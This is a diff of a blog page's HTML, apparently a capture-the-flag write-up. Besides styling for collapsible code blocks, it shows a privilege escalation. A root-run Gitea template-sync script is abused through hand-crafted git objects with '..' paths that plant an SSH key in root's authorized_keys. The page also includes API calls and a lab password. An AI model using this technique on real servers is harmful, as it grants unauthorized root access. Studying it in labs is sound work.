@@ -61,6 +61,42 @@ nav .container { display: flex; align-items: center; justify-content: space-betw
 .content pre { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
 .content pre code { color: var(--text); background: none; padding: 0; font-size: 13px; line-height: 1.6; white-space: pre; }
 .content img { width: 100%; border-radius: 6px; border: 1px solid var(--border); margin: 1rem 0; display: block; }
+/* CODE PEEK / EXPAND — shows first 5 lines, toggle sits at the bottom, one shared scrollbar */
+.code-clamp { margin: 1rem 0; }
+.code-clamp .code-toggle-checkbox { display: none; }
+.code-clamp .code-scroll {
+background: var(--surface);
+border: 1px solid var(--border);
+border-bottom: none;
+border-radius: 6px 6px 0 0;
+overflow-x: auto;
+padding: 1rem;
+}
+.code-clamp .code-scroll pre { margin: 0; padding: 0; border: none; border-radius: 0; background: none; overflow: visible; width: max-content; min-width: 100%; }
+.code-clamp .code-scroll pre.code-rest { display: none; }
+.code-clamp .code-toggle-checkbox:checked ~ .code-scroll pre.code-rest { display: block; }
+.code-clamp .toggle-line {
+display: flex;
+align-items: center;
+gap: 6px;
+padding: 0.5rem 1rem;
+background: var(--surface);
+border: 1px solid var(--border);
+border-top: none;
+border-radius: 0 0 6px 6px;
+font-family: var(--mono);
+font-size: 11px;
+color: var(--text-dim);
+cursor: pointer;
+user-select: none;
+transition: color 0.15s;
+}
+.code-clamp .toggle-line:hover { color: var(--text); }
+.code-clamp .chevron { color: var(--accent); font-size: 10px; transition: transform 0.15s; flex-shrink: 0; }
+.code-clamp .code-toggle-checkbox:checked ~ .toggle-line .chevron { transform: rotate(90deg); }
+.code-clamp .label-less { display: none; }
+.code-clamp .code-toggle-checkbox:checked ~ .toggle-line .label-more { display: none; }
+.code-clamp .code-toggle-checkbox:checked ~ .toggle-line .label-less { display: inline; }
 /* BACK LINK */
 .post-nav { margin: 3rem 0 2rem; padding-top: 1.5rem; border-top: 1px solid var(--border); }
 .post-nav a { display: inline-flex; align-items: center; gap: 6px; font-size: 13px; color: var(--text-dim); text-decoration: none; }
@@ -161,12 +197,15 @@ cat user.txt
 <p>Upon taking a look at the previous linpeas output again, this service seemed interesting and could possibly give us the privilege escalation we need — a systemd timer, <code>gitea-template-sync.timer</code>, running <code>/etc/gitea/template-sync.py</code> as <strong>root</strong>. The script walks any Gitea repo flagged <code>template:true</code> and copies its tracked files into a staging directory.</p>
 <img src="https://i.imgur.com/SZXsS6n.png" alt="Discovering the root-owned gitea-template-sync systemd timer" />
 <p>Below is the vulnerable code:</p>
-<pre><code>import os  
+<div class="code-clamp">
+<input type="checkbox" id="code-1" class="code-toggle-checkbox">
+<div class="code-scroll">
+<pre class="code-first"><code>import os  
 import sys  
 import json  
 import subprocess  
-import time  
-import urllib.request  
+import time  </code></pre>
+<pre class="code-rest"><code>import urllib.request  
   
 GITEA_URL = "http://localhost:3000"  
 REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"  
@@ -305,39 +344,57 @@ def main():
   
 if __name__ == '__main__':  
     main()</code></pre>
+</div>
+<label for="code-1" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 139 more lines</span><span class="label-less">Show less</span></label>
+</div>
 <p><code>filepath</code> comes straight from <code>git ls-tree</code> with zero sanitization, then flows into <code>os.path.join(stage_path, filepath)</code>, which happily walks <code>..</code> sequences right out of the staging directory. A tree entry literally named <code>../../../../../root/.ssh/authorized_keys</code> gets written to the real path and since the script runs as root, the write goes through.</p>
 <p>Normally you couldn't get away with this as the standard <code>git</code> client refuses to let a tree entry contain <code>..</code>. <code>git add</code>, <code>git commit</code>, even <code>git update-index --cacheinfo</code>, all validate and reject it. The way around it is to skip the Git client entirely and hand-build the raw blob/tree/commit objects directly, since nothing at that layer checks path safety, only the porcelain commands do.</p>
 
 <p>We then create an SSH key and make a API call to gitea to have a token created. We also make the token a variable we'll be using next.</p>
-<pre><code>ssh-keygen -t ed25519 -f /tmp/.k -N ''
+<div class="code-clamp">
+<input type="checkbox" id="code-2" class="code-toggle-checkbox">
+<div class="code-scroll">
+<pre class="code-first"><code>ssh-keygen -t ed25519 -f /tmp/.k -N ''
 
 curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
   -H "Content-Type: application/json" \
-  -u "jones:y27xb3ha!!74GbR" \
-  -d '{"name":"newtoken","scopes":["write:user","write:repository"]}'
+  -u "jones:y27xb3ha!!74GbR" \</code></pre>
+<pre class="code-rest"><code>  -d '{"name":"newtoken","scopes":["write:user","write:repository"]}'
 </code></pre>
+</div>
+<label for="code-2" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 2 more lines</span><span class="label-less">Show less</span></label>
+</div>
 <img src="https://i.imgur.com/W7wqpAR.png" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
 
 <p>We then make further API calls to create the malicious repo.</p>
-<pre><code>curl -X POST http://localhost:3000/api/v1/user/repos \
+<div class="code-clamp">
+<input type="checkbox" id="code-3" class="code-toggle-checkbox">
+<div class="code-scroll">
+<pre class="code-first"><code>curl -X POST http://localhost:3000/api/v1/user/repos \
   -H "Authorization: token $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"name":"rce","private":false}'
-
-curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
+</code></pre>
+<pre class="code-rest"><code>curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
   -H "Authorization: token $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"template":true}'
 </code></pre>
+</div>
+<label for="code-3" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 5 more lines</span><span class="label-less">Show less</span></label>
+</div>
 
 <p>Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
 
-<pre><code>#!/usr/bin/env python3  
+<div class="code-clamp">
+<input type="checkbox" id="code-4" class="code-toggle-checkbox">
+<div class="code-scroll">
+<pre class="code-first"><code>#!/usr/bin/env python3  
 import hashlib,zlib,os,subprocess,sys,time  
   
 def write_obj(data,t):  
-    h=("%s %d"%(t,len(data))).encode()+b"\x00"  
-    s=h+data  
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"  </code></pre>
+<pre class="code-rest"><code>    s=h+data  
     sha=hashlib.sha1(s).hexdigest()  
     d=os.path.join(".git","objects",sha[:2])  
     os.makedirs(d,exist_ok=True)  
@@ -371,7 +428,10 @@ sha=write_obj(c.encode(),"commit")
 os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)  
 open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")  
 print("Done: "+sha)</code></pre>
-</p>Initializing the local repo and setting the remote before crafting the objects.</p>
+</div>
+<label for="code-4" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 34 more lines</span><span class="label-less">Show less</span></label>
+</div>
+<p>Initializing the local repo and setting the remote before crafting the objects.</p>
 <img src="https://i.imgur.com/yhcw5bR.png" alt="Initializing the local repo and setting the remote before crafting the objects" />
 <img src="https://i.imgur.com/Wtlta8c.png" alt="setting the remote before crafting the objects" />
 
